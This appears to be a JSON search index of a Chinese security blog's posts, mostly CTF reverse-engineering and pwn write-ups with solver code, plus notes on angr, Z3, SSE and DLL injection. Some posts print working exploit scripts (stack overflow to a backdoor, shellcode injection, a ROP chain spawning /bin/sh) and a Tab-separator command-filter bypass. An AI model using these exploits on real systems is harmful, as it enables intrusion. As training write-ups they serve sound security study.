
[
  
  
  {
    "objectID": "1748242851",
    "permalink": "/post/litctf2025/",
    "title": "LitCTF2025(未完成)",
    
    "content": " easy_rc4 一眼key = FenKey!!，提取出密文后直接在线网站解码 后面还有个xor 0x20的操作\nLitCTF{71bb2a06417a5306ba297ddcfce7b1b0}\npickle python的Pickle反序列化，用pickletools提取字节流反汇编\nimport pickletools with open(\u0026#34;challenge.pickle\u0026#34;, \u0026#34;rb\u0026#34;) as f: data = f.read() pickletools.dis(data) 翻译后大概是这样\ndef check(user_input): raw = input(\u0026#34;input your flag \u0026gt; \u0026#34;) flag_bytes = raw.encode() result = [] for i in range(len(encrypted_flag)): b = flag_bytes[i] ^ key_ints[i % len(key_ints)] result.append(b) if tuple(result) == encrypted_flag: print(\u0026#34;Good job! You made it!\u0026#34;) return True else: print(\u0026#34;Nah, don\u0026#39;t give up!\u0026#34;) return False 提取出encrypted_flag和key_ints\n逆向\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;string\u0026gt; void boom(const char *flag, int key) { char tmp[45] = \u0026#34;\u0026#34;; for(int i = 0;i \u0026lt; 45;i++) { tmp[i] = flag[i] + key; } if(strstr(tmp,\u0026#34;LitCTF\u0026#34;) != NULL) { printf(\u0026#34;%s\\n\u0026#34;,tmp); } } int main() { int encrypted_flag[] = { 85, 84, 174, 227, 132, 190, 207, 142, 77, 24, 235, 236, 231, 213, 138, 153, 60, 29, 241, 241, 237, 208, 144, 222, 115, 16, 242, 239, 231, 165, 157, 224, 56, 104, 242, 128, 250, 211, 150, 225, 63, 29, 242, 169 }; short key[] = { 19, 55, 192, 222, 202, 254, 186, 190 }; char flag[45] = \u0026#34;\u0026#34;; for(int i = 0;i \u0026lt; 45;i++) { flag[i] = encrypted_flag[i] ^ key[i % 8]; } for(int i = 0;i \u0026lt; 0xFF;i++) { boom(flag,i); } } LitCTF{6d518316-5075-40ff-873a-d1e8d632e208}\neasy_tea 看题目带有tea，猜测tea模板题，解压出来文件名为\u0026quot;花\u0026quot;，猜测有花指令\nIDA载入无法直接F5，直接分析反汇编大体内容\n找到疑似key和密文的数据，再找找TEA算法在哪实现\n进入call内部\n去花，然后重构，长这样 TEA的delta值被魔改了，为0x114514 回到main函数，修复试试 NOP掉上图红框部分和上面的db 0，再nop掉jmp short loc_4150A9\n还是有点问题，但没影响了，解密时记得小端序存储问题就行了\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // TEA 解密模板（delta=0x114514） void tea_decrypt(uint32_t v[2], const uint32_t k[4]) { uint32_t v0 = v[0]; uint32_t v1 = v[1]; const uint32_t delta = 0x114514; uint32_t sum = delta * 32; for (int i = 0; i \u0026lt; 32; i++) { v1 -= ((v0 \u0026lt;\u0026lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 \u0026gt;\u0026gt; 5) + k[3]); v0 -= ((v1 \u0026lt;\u0026lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 \u0026gt;\u0026gt; 5) + k[1]); sum -= delta; } v[0] = v0; v[1] = v1; } int main(void) { uint32_t enc[] = { 0x977457FE,0x0DA3E1880, 0x0B8169108,0x1E95285C, 0x1FE7E6F2,0x2BC5FC57, 0x0B28F0FA8,0x8E0E0644, 0x68454425,0x0C57740D9 }; size_t n_enc = sizeof(enc)/sizeof(enc[0]); size_t n_blocks = n_enc / 2; const uint32_t key[4] = { 0x11223344, 0x55667788, 0x99AABBCC, 0xDDEEFF11, }; uint8_t flag[n_blocks*8 + 1]; size_t pos = 0; for (size_t i = 0; i \u0026lt; n_blocks; i++) { uint32_t v[2] = { enc[2*i], enc[2*i + 1] }; tea_decrypt(v, key); for (int b = 0; b \u0026lt; 4; b++) { flag[pos++] = (v[0] \u0026gt;\u0026gt; (8 * b)) \u0026amp; 0xFF; } for (int b = 0; b \u0026lt; 4; b++) { flag[pos++] = (v[1] \u0026gt;\u0026gt; (8 * b)) \u0026amp; 0xFF; } } flag[pos] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;%s\\n\u0026#34;, flag); return 0; } LitCTF{590939df61690383a47ed1bc6ade9d51}\ntest_your_nc 没过滤Tab键，在shell中Tab键可以当作分隔符\n利用python读取文件并打印就行了\npython3\u0026lt;TAB\u0026gt;-c\u0026lt;TAB\u0026gt;\u0026#34;print(open(\u0026#39;flag\u0026#39;).read())\u0026#34; ",
    
    "date": "2025-05-26 15:00:51",
    "updated": "2025-05-26 15:00:51"
  }
  
  , 
  {
    "objectID": "1747811746",
    "permalink": "/post/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91%E4%B8%89%E6%9C%9F%E7%95%99%E6%A1%A3/",
    "title": "滴水逆向三期",
    
    "content": " 0x00 前言 滴水三期课程 滴水逆向三期课件\n",
    
    "date": "2025-05-21 15:15:46",
    "updated": "2025-05-21 15:15:46"
  }
  
  , 
  {
    "objectID": "1747360760",
    "permalink": "/post/dll%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E6%88%AA%E5%B1%8F/",
    "title": "DLL注入实现反截屏",
    
    "content": " 思路 SetWindowDisplayAffinity函数，可以设定窗口的显示属性，只能用于调用进程拥有的窗口——否则调用会失败但不报告特定错误 将SetWindowDisplayAffinity封装为DLL 利用注入器将DLL注入目标进程实现反截屏 基础函数 DLL部分 SetWindowDisplayAffinity 语法 bool setWindowDisPlayAffility（ [in] HWND hWnd, [in] DWORD dwAffinity ); 参数 hWnd：顶级窗口的句柄。 窗口必须属于当前进程 dwAffinity：指定窗口内容的显示位置的显示相关性设置。 值 含义 WDA_NONE 对窗口的显示位置没有限制 WDA_MONITOR 窗口内容仅显示在监视器上。 在其他任何位置，窗口都会显示，其中不显示任何内容 WDA_EXCLUDEFROMCAPTURE 窗口仅显示在监视器上。 在其他任何位置，窗口根本不显示 返回值 如果函数成功，则返回TRUE;例如，在非顶级窗口上进行函数调用时，它将返回FALSE 。 要获得更多的错误信息，请调用 GetLastError\nDllMain 语法 BOOL WINAPI DllMain( _In_ HINSTANCE hinstDLL, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved ); 参数\nhinstDLL: DLL 模块的句柄，值是 DLL 的基址，DLL 的 HINSTANCE 与 DLL 的 HMODULE 相同，因此可以在调用需要模块句柄的函数时使用 hinstDLL fdwReason: 指示调用 DLL 入口点函数的原因代码, 可能的值为： DLL_PROCESS_ATTACH：进程正在加载 DLL，使用这个 DLL_THREAD_ATTACH：线程正在附加到 DLL，每个新线程都触发，导致高频重复调用 DLL_THREAD_DETACH：线程正在分离 DLL DLL_PROCESS_DETACH：进程正在卸载 DLL lpvReserved: 如果DLL_PROCESS_ATTACH fdwReason，则 lpvReserved 对于动态加载为 NULL，对于静态加载为非 NULL，一般不关心这个 框架\nBOOL WINAPI …",
    
    "date": "2025-05-16 09:59:20",
    "updated": "2025-05-16 09:59:20"
  }
  
  , 
  {
    "objectID": "1747226299",
    "permalink": "/post/angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/",
    "title": "Angr符号执行",
    
    "content": " 基础知识点 angr-documentation 这个文档描述已经很详细，我只做后续常用的笔记\nangr.Project 初始化一个 Project，它是 angr 的核心对象，管理整个二进制分析流程\n加载二进制文件：解析 ELF（或 PE、Mach-O 等格式），建立基础结构。 反汇编（可选）：构建控制流图（CFG）或加载符号表。 加载函数、段落、地址空间等：为后续分析提供基础。 自动加载库（默认开启）：比如 libc.so，除非你传了 auto_load_libs=False .factory blank_state()：创建一个空的状态，可以用来作为初始状态，没有前置执行（手动设置寄存器、内存） state = project.factory.blank_state(addr=0x400000) 创建一个空状态（不执行 main），可以手动设置寄存器、栈、内存。适合特定函数分析或构造特殊状态\nentry_state()：创建一个初始状态，指向程序入口点。 state = project.factory.entry_state() 从程序入口（main 前的 _start 或 libc 初始化）开始执行。适合从程序一开始完整符号执行\ncall_state(addr, arg1, arg2, \u0026amp;hellip;) state = project.factory.call_state(0x401000, arg1, arg2) 模拟函数调用，比如分析函数 foo(arg1, arg2)，可以直接指定地址和参数。\nfull_init_state()：创建一个完整的初始状态，包括栈、内存、文件、网络等 state = project.factory.full_init_state(args=[\u0026amp;#39;./00_angr_find\u0026amp;#39;]) simulation_manager(state),simgr(state)：创建一个模拟器，用于执行程序 simgr = project.factory.simulation_manager(state) 创建状态管理器（路径探索器），可以用 .explore()、.step() 等方式调度执行路径。\n.explore() find=None：指定目标地址，探索器会在路径中找到这个地址，并停止 num_find=None：指定 …",
    
    "date": "2025-05-14 20:38:19",
    "updated": "2025-05-14 20:38:19"
  }
  
  , 
  {
    "objectID": "1746353753",
    "permalink": "/post/%E9%93%BE%E8%A1%A8/",
    "title": "链表(未完成)",
    
    "content": " 前言 本篇主要是对链表的内存结构进行学习，可能会进入长时间待机状态，可以先不看，等过一段时间的补充\n什么是链表？ 在计算机科学中，链表是一种重要的动态数据结构，它由一系列节点（每个节点包含数据域和指针域）通过指针串联而成，适用于频繁插入和删除操作且无需事先分配连续内存空间。与数组相比，链表在任意位置的插入与删除可在 O(1) 时间内完成（给定指针时），而数组通常需 O(n) 的元素移动开销。链表广泛应用于实现栈、队列、图的邻接表、操作系统的内存管理和任务调度等场景。但链表也有随机访问效率低（访问第 i 项需 O(n)）和额外指针空间开销的缺点，因此在需要高效索引或缓存友好时，数组更具优势 链表每新增或删除一个节点，仅需调整相关指针，无须像数组那样移动大量元素\n定义 链表是一种数据结构，它由一系列节点组成，每个节点包含两个部分：\n数据域 指针域 数据域存储数据值，指针域存储指向下一个节点的地址。链表的头节点（第一个节点）的指针域指向第一个节点，最后一个节点的指针域指向 NULL。\n为了便于理解，可以将链表视为多个结构体使用指针相互链接\n构建链表节点 单向链表 struct Node{ int data; // 数据域 Node* next; // 指针域 }; 双向链表 struct Node { int value; Node *left; Node *right; }; ",
    
    "date": "2025-05-04 18:15:53",
    "updated": "2025-05-04 18:15:53"
  }
  
  , 
  {
    "objectID": "1745854940",
    "permalink": "/post/sse%E6%8C%87%E4%BB%A4%E9%9B%86%E5%AD%A6%E4%B9%A0/",
    "title": "SSE指令集学习",
    
    "content": " SSE 数据类型 SSE提供了以下新的数据类型：\nTechnology _m64 _m128 _m128d _m128i _m256 _m256d _m256i _m512 _m512d _m512i Intel® MMX™ Technology Intrinsics Yes NA NA NA NA NA NA NA NA NA Intel® Streaming SIMD Extensions Intrinsics Yes Yes NA NA NA NA NA NA NA NA Intel® Streaming SIMD Extensions 2 Intrinsics Yes Yes Yes Yes NA NA NA NA NA NA Intel® Streaming SIMD Extensions 3 Intrinsics Yes Yes Yes Yes NA NA NA NA NA NA Advanced Encryption Standard Intrinsics + Carry-less Multiplication Intrinsic Yes Yes Yes Yes NA NA NA NA NA NA Half-Float Intrinsics Yes Yes Yes Yes NA NA NA NA NA NA Intel® Advanced Vector Extensions Intrinsics Yes Yes Yes Yes Yes Yes Yes NA NA NA Intel® Advanced Vector Extensions 512 Intrinsics Yes Yes Yes Yes Yes Yes Yes Yes Yes Yes __m128i: 128位整型向量，可以容纳 16 个 8 位、8 个 16 位、4 个 32 位或 2 个 64 位整数值 __m128d: 128位浮点型向量 __m128: 容纳四个32位浮点值 对于__m128d和__m128i，编译器自动把局部和全局变量在栈上对齐16字节。若需要对齐整型、float和double数组，使用__declspec(align)\n要访问8位数据 __m128i a = _mm_set1_epi8(1); // 在目标 __m128i 向量中将 每个 8-位整型元素（共 16 …",
    
    "date": "2025-04-28 23:42:20",
    "updated": "2025-04-28 23:42:20"
  }
  
  , 
  {
    "objectID": "1745595588",
    "permalink": "/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/",
    "title": "攻防世界 Pwn",
    
    "content": " 1. pwnstack[N1] exp from pwn import * # r = process(\u0026amp;#34;./pwn2\u0026amp;#34;) r = remote(\u0026amp;#39;223.112.5.141\u0026amp;#39;, 58471) back_door = 0x400762 payload = b\u0026amp;#34;a\u0026amp;#34; * (0xA0 + 8) + p64(back_door) r.send(payload) r.interactive() 2. repeater[N1] repeater\n分析 checksec输出：\nArch: amd64 RELRO: Full RELRO #GOT只读 Stack: No canary found #栈溢出保护未开 NX: NX unknown - GNU_STACK missing PIE: PIE enabled #地址随机化 Stack: Executable #栈可执行 RWX: Has RWX segments 栈可执行，大概率要写入shellcode，开启了PIE，需要泄露main函数地址 IDA查看 没有后门，那就要写入shellcode然后利用栈溢出执行了\nsub_982(s_, 48);可以将shellcode写入s_地址，也就是最后需要ret的地址\nshellcode = asm(shellcraft.sh()) r.sendlineafter(b\u0026amp;#34;name :\u0026amp;#34;, shellcode) for循环处有一个read，Tab键查看写入的地址\nlea rax, [rbp-30h] mov edx, 40h mov rsi, rax mov edi, 0 call _read 再看n1192227的写入地址\nmov dword ptr [rbp-10h], 123123h 中间相隔0x20，需要覆盖这段地址，然后往n1192227写入3281697使if语句成立泄露main函数地址\nnum = 3281697 payload = b\u0026amp;#34;a\u0026amp;#34; * 0x20 + p64(num) r.sendlineafter(b\u0026amp;#34;input :\u0026amp;#34;, payload) data = r.recvuntil(b\u0026amp;#34;you :\\n\u0026amp;#34;) #puts函数自带\\n main_addr = …",
    
    "date": "2025-04-25 23:39:48",
    "updated": "2025-04-25 23:39:48"
  }
  
  , 
  {
    "objectID": "1745584796",
    "permalink": "/post/jqctf2025/",
    "title": "JQCTF2025(未完成)",
    
    "content": " 第三届京麒CTF-JQCTF-2025-热身赛-re1 JQCTF2025-热身赛-re1\n分析 Rust逆向,头一回见,直接拖入IDA分析\n函数看起来都很奇怪,动态调试看看 运行到这个call时，提示输入字符串，然后输入后终端输出err,说明所有的判断或加密都在这个call里，步入看看 到这里再按F5反编译,就是用户函数了\n一看300多行代码,直接转到最后面 找到判断函数 分析v29是什么, v29 = *(_WORD *)Src_9; 其中Src_9是我输入的字符串，WORD获取2字节，由于已知输入的字符串必定是flag的形式,所以可以猜测v29是flag的第2个字节，就是fl\n中间的加密比较复杂，但是注意到在前面创建密钥时，并没有用到我们输入的后面的内容，所以可以动调获取密钥，查看buf2有42个字节，所以要爆破用于xor的42个密钥\n鼠标点击Buf1[Size_2] = *(_BYTE *)(Src_9 + Size_2) ^ (Size_2 + ((2 * (v35 \u0026amp; 0x55)) | (v35 \u0026gt;\u0026gt; 1) \u0026amp; 0x55));所在行，按下Tab键，可以转到该行代码的汇编代码 在此处下断点，然后开始动调 可以看到[r14+rax]就是我们输入的字符串，cl就是要异或的密钥，所以我们可以用idc爆破cl\n#include \u0026lt;idc.idc\u0026gt; static main(){ auto i; for(i = 0;i \u0026lt; 42;i++){ Message(\u0026#34;0x%X,\u0026#34;,GetRegValue(\u0026#34;CL\u0026#34;)); RunTo(0x7FF79CE91534); GetDebuggerEvent(WFNE_SUSP, -1); } } 可以看到key已经爆破出来了\nkey = [ 0x66,0xCD,0x9A,0x34,0x67,0xCB,0x93,0x22,0x3E,0x75, 0xE3,0xBE,0x72,0xD9,0xA7,0x41,0x75,0xDB,0xA6,0x3B, 0x64,0xB5,0x57,0x9A,0x1E,0x25,0x33,0x4E,0x83,0xEB, 0xBB,0x5A,0x96,0x0D,0xFA,0xD4,0x86,0xE9,0xAF,0x3A, 0x4E,0x76 ] 接下来就是简单的xor了\nexp buf2 = [ 0x00,0xA1,0xFB,0x53,0x1C,0xFA,0xF0,0x1B,0x06,0x40, 0xD4,0x8C,0x16,0xF4,0x90,0x27,0x42,0xB9,0x8B,0x0F, 0x02,0xD7,0x31,0xB7,0x26,0x12,0x06,0x7E,0xAE,0xDF, 0xDA,0x68,0xAF,0x35,0xCC,0xB7,0xB0,0xD0,0x9A,0x59, 0x2B,0x0B ] key = [ 0x66,0xCD,0x9A,0x34,0x67,0xCB,0x93,0x22,0x3E,0x75, 0xE3,0xBE,0x72,0xD9,0xA7,0x41,0x75,0xDB,0xA6,0x3B, 0x64,0xB5,0x57,0x9A,0x1E,0x25,0x33,0x4E,0x83,0xEB, 0xBB,0x5A,0x96,0x0D,0xFA,0xD4,0x86,0xE9,0xAF,0x3A, 0x4E,0x76 ] for i in range(len(key)): print(chr(key[i] ^ buf2[i]), end=\u0026#39;\u0026#39;) flag{1c98572d-7f7b-4fbf-8750-4a2986c695ce}\n第三届京麒CTF-JQCTF-2025-热身赛-re2 JQCTF2025-热身赛-re1\n分析 IDA打开,f5反编译，发现是see3指令集 排列顺序和加法常量都给了 直接对每位减常量后再反转就行了\nexp cipher = b\u0026#34;cge87k?9\u0026lt;\u0026gt;?@=pss393=\u0026gt;;8@:Cp@DAuH\u0026#34; def inv_block(c): sub = [(c[i] - (i+1)) \u0026amp; 0xFF for i in range(16)] # 减 mask2，并 wrap-around :contentReference[oaicite:4]{index=4} return bytes(sub[::-1]) # mask1 反转即[::-1] :contentReference[oaicite:5]{index=5} flag_bytes = inv_block(cipher[:16]) + inv_block(cipher[16:]) print(flag_bytes.decode()) flag{cdb0444318e24beb8f374e9181599072}\n",
    
    "date": "2025-04-25 20:39:56",
    "updated": "2025-04-25 20:39:56"
  }
  
  , 
  {
    "objectID": "1745584573",
    "permalink": "/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-reverse/",
    "title": "攻防世界 Reverse",
    
    "content": " 0x01 echo-server[N3] echo-server\n分析 本题主要考察花指令分析 执行程序，发现没有环境，使用下面的指令安装环境\nyay -S lib32-openssl-1.0 IDA 查看 查看反汇编 将爆红的 call 转为数据，可以看到有db 0E8h，是常见的花指令，用 NOP 填充后重新用 IDA 打开，后续大多是这样操作 选中第一段按下 P，注意不要选到 nop 了 可以成功反编译了，但是还有一处异常 查看反汇编窗口，这里应该是一个判断，不应该跳转到自己的开头，然后判断失败后直接执行 exit，\n结合上一段汇编代码，这里应该是上一段的接续，直接 nop 掉不应该存在的跳转指令 nop 掉后，逻辑就清晰了，再次 F5 反汇编 如图，反汇编正常了 接下来分析程序逻辑，开始动调，输入F1@gA，查看汇编代码 这里应该跳转的，但是没跳转，直接执行 exit，试试直接修改为 jmp\n输出F8C60EB40BF66919A77C4BD88D45DEF4 提交，发现这就是 flag\nexp F8C60EB40BF66919A77C4BD88D45DEF4 0x02 catch-me[N3] catch-me\n分析 拖入 IDA，查看反汇编\n从 byte_6012A8 到 dword_6012AC 占用连续的空间，猜测是同一个数组\n动调得到 v3 的值为0xB11924E1 得到 getenv(\u0026amp;quot;CTF\u0026amp;quot;) = v3 ^ 0xFEEBFEEB 猜测 getenv(\u0026amp;quot;ASIS\u0026amp;quot;) == getenv(\u0026amp;quot;CTF\u0026amp;quot;)\n中间一大堆的 SSE 指令没对 haystack 做修改，先跳过，想了解可以看\nSSE 指令集学习\n解法 1 程序通过 getenv 函数获取环境变量的值，那么直接往环境变量里写入正确的值就行了\n可以通过 export 设置临时环境变量，终端关闭后自动清除\n(通过printf可以导入十六进制整数类型，值得积累) export ASIS=\u0026amp;#34;$(printf \u0026amp;#34;\\x0a\\xda\\xf2\\x4f\u0026amp;#34;)\u0026amp;#34; #注意参数是从低位到高位的 export CTF=\u0026amp;#34;$(printf \u0026amp;#34;\\x0a\\xda\\xf2\\x4f\u0026amp;#34;)\u0026amp;#34; 解法 2 纯逆 …",
    
    "date": "2025-04-25 20:36:13",
    "updated": "2025-04-25 20:36:13"
  }
  
  , 
  {
    "objectID": "1745246559",
    "permalink": "/post/buuctf-reverse/",
    "title": "BUU-Reverse",
    
    "content": " [安洵杯 2019]crackMe [安洵杯 2019]crackMe\n分析 MessageBoxW被hook跳转到了别的函数，这部分在拓展再说，先分析程序\n跳转到了sub_C02AB0，进行了两步操作 base64表的大小写互换 注册VEH 然后回到main函数，安装了一个SEH,然后将eax清零，在地址0(eax)写入数据，触发 EXCEPTION_ACCESS_VIOLATION异常，执行异常处理 以下是Windows 用户态异常处理的四个主要阶段\nflowchart LR A[\u0026#34;触发异常\u0026#34;]--\u0026gt;B[\u0026#34;调试器\u0026#34;]--\u0026gt;C[\u0026#34;向量化异常处理(VEH)\u0026#34;]--\u0026gt;D[\u0026#34;结构化异常处理(SEH)\u0026#34;]--\u0026gt;E[\u0026#34;顶层未处理异常过滤器(UEF)\u0026#34;] 由于已经注册了VEH，所以先进入VEH处理\nVEH中进行了两步操作\n用where_are_u_now?初始化sm4加密 设置 UEF 为 TopLevelExceptionFilter SEH中对输入进行sm4加密，返回值为 1，继续进行错误处理 进入UEF(TopLevelExceptionFilter)\n对str2每两位进行置换，然后对str1进行变种base64加密 进入sub_C0126C\n这里将str1进行变种base64加密，加密算法为base64换表，base64有两处换表\n大小写互换 整个表想左移动24字符 最终表为yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx 最后str1和str2在sub_C01136进行对比\nexp import base64 from pysm4 import decrypt from Crypto.Util.number import long_to_bytes key = \u0026amp;#34;where_are_u_now?\u0026amp;#34; key = key.encode().hex() Str2 = \u0026amp;#34;1UTAOIkpyOSWGv/mOYFY4R==\u0026amp;#34; # !要改成= temp = list(Str2) for i in range(0,len(temp),2): temp[i],temp[i+1] = temp[i+1],temp[i] res = \u0026amp;#34;\u0026amp;#34;.join(temp) …",
    
    "date": "2025-04-21 22:42:39",
    "updated": "2025-04-21 22:42:39"
  }
  
  , 
  {
    "objectID": "1745160795",
    "permalink": "/post/buuctf-pwn/",
    "title": "BUUCTF Pwn",
    
    "content": " [HarekazeCTF2019]baby_rop babyrop\n分析 拖入IDA,查看main汇编代码 push rbp mov rbp, rsp sub rsp, 10h ; 为堆栈开辟0x10的空间 mov edi, offset command ; \u0026#34;echo -n \\\u0026#34;What\u0026#39;s your name? \\\u0026#34;\u0026#34; call _system lea rax, [rbp+var_10] ; 缓冲区开始写入位置 mov rsi, rax mov edi, offset p__s ; \u0026#34;%s\u0026#34; mov eax, 0 call ___isoc99_scanf ; 对于scanf(\u0026#34;%s\u0026#34;, buf)这个调用,格式化字符串\u0026#39;%s\u0026#39;存储在rdi,写入地址buf存储在rsi lea rax, [rbp+var_10] mov rsi, rax mov edi, offset format ; \u0026#34;Welcome to the Pwn World, %s!\\n\u0026#34; mov eax, 0 call _printf mov eax, 0 leave retn shift+F12查看字符串可以找到有\u0026rsquo;/bin/sh\u0026rsquo;,地址为0x601048 再找到system的调用地址(call _system)为0x4005E3 将binsh的地址pop给rdi,再调用system 先用ROPgadget找到pop rdi;ret的gadget地址为0x400683 构造payload\nsys_addr = 0x4005E3 pop_rdi_ret = 0x400683 binsh_addr = 0x601048 payload = b\u0026#39;a\u0026#39; * (0x10 + 8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr) exp from pwn import * context.arch = \u0026#39;amd64\u0026#39; r = process(\u0026#39;./babyrop\u0026#39;) sys_addr = 0x4005E3 pop_rdi_ret = 0x400683 binsh_addr = 0x601048 # payload = b\u0026#39;a\u0026#39; * (0x10 + 8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr) payload = flat([ b\u0026#39;a\u0026#39; * (0x10 + 8), pop_rdi_ret, binsh_addr, sys_addr ]) r.sendline(payload) r.interactive() ",
    
    "date": "2025-04-20 22:53:15",
    "updated": "2025-04-20 22:53:15"
  }
  
  , 
  {
    "objectID": "1745071614",
    "permalink": "/post/ret2syscall/",
    "title": "Ret2syscall",
    
    "content": " 前置知识 假设有以下程序\n#include \u0026amp;lt;stdio.h\u0026amp;gt; char shellcode[0x100] = \u0026amp;#34;hello world\u0026amp;#34;; my_puts(){ write(1, shellcode, 0x100); } int main(){ my_puts(); return 0; } 代码很简单,就是输出字符串\u0026amp;quot;hello world\u0026amp;quot; 但这一串代码在操作系统层面如何实现?\nflowchart LR A[\u0026#34;my_puts()\u0026#34;] --\u0026gt; B[\u0026#34;write()\u0026#34;] --\u0026gt; C[\u0026#34;sys_write()\u0026#34;] --\u0026gt; D[\u0026#34;标准输出\u0026#34;] my_puts()调用了动态链接库libc.so中的write()函数 write(1,\u0026amp;amp;\u0026amp;ldquo;hello world\u0026amp;rdquo;,12) write()将传入参数包装为汇编代码[eax = 4;ebx = 1;ecx = \u0026amp;amp;\u0026amp;quot;hello world\u0026amp;quot;;edx = 12;] + int 0x80; write()函数其实就是对write系统调用的封装 执行完成后才进入了内核kernel中的sys_write()函数 sys_write()函数会将字符串\u0026amp;quot;hello world\u0026amp;quot;写入到标准输出设备中\n什么是系统调用 系统调用是操作系统提供给用户态程序调用的接口，它是操作系统内核与用户态程序之间的接口，它提供了系统调用的入口，用户态程序通过系统调用与内核进行交互。 本质上时一些内核函数代码(一段指令),以规范的方式驱动硬件 x86通过int 0x80指令实现系统调用,amd64通过syscall指令实现系统调用 什么是libc.so 这是一个动态链接库，它包含了系统调用的实现，如open(),read(),write()等等,libc.so随着系统版本更新也会进行更新 操作系统如何调用不同版本的libc的同一个函数呢? 这里可以类比Windows系统创建的快捷方式,无论软件版本怎么变化,快捷方式都指向同一个文件,当快捷方式被点击时,系统会自动调用对应的程序 system()函数 有了上面的基础,可以知道system()其实是对execve()系统调用的封装,execve()可以执行外部可执行文件,system()可以执行 …",
    
    "date": "2025-04-19 22:06:54",
    "updated": "2025-04-19 22:06:54"
  }
  
  , 
  {
    "objectID": "1745043208",
    "permalink": "/post/ret2libc/",
    "title": "Ret2libc(未完成)",
    
    "content": " 前置知识 re2syscall GOT表和PLT表 GOT: Global Offset Table, 全局偏移表，包含所有需要动态链接的外部函数的地址(在第一次执行后) PLT: Procedure Link Table, 过程链接表，包含调用外部函数的跳转指令(跳转到GOT表中)，以及初始化外部调用指令(用于链接器动态绑定dl_runtime_resolve) 延迟绑定机制 在 Linux 下，动态链接采用“懒绑定”（lazy binding）策略：编译器将对外部函数（如 foo）的调用编译进 PLT（Procedure Linkage Table） 中的伪代码，而函数真正的地址保存在 GOT（Global Offset Table） 中。首次调用时，通过 PLT0 跳入动态链接器执行符号解析（即 _dl_runtime_resolve），并将解析结果回写到 GOT 条目；后续调用则直接通过 GOT 跳转到实际函数地址，省去额外解析开销。\n动态链接过程 以调用system为例\n首次调用 flowchart LR A[\u0026#34;call system\u0026#34;] --\u0026gt; B[\u0026#34;system@plt\u0026#34;] B --\u0026gt; C[\u0026#34;system@got\u0026#34;] C --\u0026gt; D[\u0026#34;glibc中的system函数地址\u0026#34;] D --\u0026gt;|\u0026#34;存储地址\u0026#34;| C D --\u0026gt; E[\u0026#34;调用system\u0026#34;] 后续调用 flowchart LR A[\u0026#34;call system\u0026#34;] --\u0026gt; B[\u0026#34;system@plt\u0026#34;] B --\u0026gt; C[\u0026#34;system@got\u0026#34;] --\u0026gt; D[\u0026#34;调用system\u0026#34;] 由于.got中已经有了system的地址，所以后续调用时直接从.got中取地址即可，而不需要再去.got.plt中寻找。\n漏洞利用原理 通过栈溢出返回system函数的真实地址，执行/bin/sh命令获取shell 现在面临两个问题\n如何获取system函数的真实地址？ /bin/sh命令的地址如何获取？ system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变 函数的真实地址 = 函数的偏移 + libc.so中的基址 可以划分为以下步骤:\n填充无用数据覆盖缓冲区 调用puts等函数,泄露已执行 …",
    
    "date": "2025-04-19 14:13:28",
    "updated": "2025-04-19 14:13:28"
  }
  
  , 
  {
    "objectID": "1744885519",
    "permalink": "/post/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/",
    "title": "Z3约束求解",
    
    "content": " Z3约束求解 Z3是微软开源的开源软件，可以用来进行数学规划、逻辑推理、符号执行等问题的求解 常用于离散数学，逻辑学，计算机科学等领域 可以用pip安装，命令如下：\npip install z3-solver 函数介绍与使用 数据类型 数据类型 示例 解释 Bool x = Bool(\u0026amp;lsquo;x\u0026amp;rsquo;) 创建一个布尔变量x Bools x, y, z = Bools(\u0026amp;lsquo;x y z\u0026amp;rsquo;) 创建三个布尔变量x,y,z,以此类推,后面的Ints,Reals,BitVecs等都可以用这种方式创建 BitVec x = BitVec(\u0026amp;lsquo;x\u0026amp;rsquo;, 8) 创建一个8位的二进制向量变量x Int x = Int(\u0026amp;lsquo;x\u0026amp;rsquo;) 创建一个整数变量x Real x = Real(\u0026amp;lsquo;x\u0026amp;rsquo;) 创建一个实数变量x 常用函数 函数 功能 And(a, b) 逻辑与，返回a和b的逻辑与,表示同时满足a和b Or(a, b) 逻辑或，返回a和b的逻辑或,表示满足a或b Not(a) 逻辑非，返回a的逻辑非,表示不满足a Xor(a, b) 逻辑异或，返回a和b的逻辑异或,表示满足a或b，但不同时满足 If(a, b, c) 条件选择，返回a和b的条件选择，表示满足a时返回b，否则返回c Distinct(a, b, c) 不同，返回a、b、c的不同关系，表示a、b、c中没有相同的值 Sum(a, b, c) 求和，返回a、b、c的求和，表示a、b、c的和 Implies(a, b) 蕴含，返回a和b的蕴含关系，表示a成立那b必然成立，否则无所谓 PbEq([(x, 1), (y, 2), (z, 3)] , n) 伪布尔约束,x,y,z为布尔变量,1,2,3为权重,n为目标值，表示满足x*1+y*2+z*3=n 函数详解 PbEq 用于表示多个布尔变量中恰好有几个为真 s.add(PbEq([(x, 1), (y, 2), (z, 3)], 6)) # 约束条件是x*1+y*2+z*3=6 这里约束的表达式是 变量真值 * 权重 = 目标值 当所有权重为1时，表示多个目标只有一个成立 s.add(PbEq([(x, 1), (y, 1), (z, 1)], 1)) 表示条件x,y,z …",
    
    "date": "2025-04-17 18:25:19",
    "updated": "2025-04-17 18:25:19"
  }
  
  , 
  {
    "objectID": "1744781683",
    "permalink": "/post/c++%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/",
    "title": "C++进程遍历",
    
